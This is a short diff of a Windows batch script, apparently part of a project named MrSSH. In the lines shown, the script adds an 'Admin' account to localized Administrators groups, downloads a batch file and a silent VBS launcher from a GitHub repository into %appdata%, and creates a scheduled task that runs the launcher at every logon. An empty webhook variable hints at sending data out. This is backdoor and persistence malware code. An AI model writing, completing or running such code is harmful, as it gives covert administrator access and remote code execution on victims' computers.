@@ -13,8 +13,8 @@ net localgroup Administratorzy Admin /add
 net localgroup Administración  Admin /add
 
 mkdir %appdata%\MrSSH
-cd %appdata%\MrSSH & curl -Ls https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/onlogon.bat -o "onglogon.bat"
-schtasks /create /tn "MrSSH" /sc onlogon /tr "onlogon.bat"
+cd %appdata%\MrSSH & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/onlogon.bat" -o "onlogon.bat" & curl -Ls "https://raw.githubusercontent.com/dh3b/MrSSH/main/Files/Silentlog.vbs" -o "Silent.vbs"
+schtasks /create /tn "MrSSH" /sc onlogon /tr "Silent.vbs"
 cd %temp%
 
 set "webhook="
